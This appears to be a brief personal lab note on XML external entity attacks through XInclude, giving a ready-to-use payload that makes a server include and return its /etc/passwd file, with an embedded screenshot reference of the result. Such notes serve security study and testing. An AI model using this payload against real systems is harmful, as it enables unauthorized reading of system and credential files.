# XXE via XInclude

Insert an XML dummy element containing a call to `XInclude` to retrieve the `/etc/passwd` file.

`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`

![[exploited-3.png]]
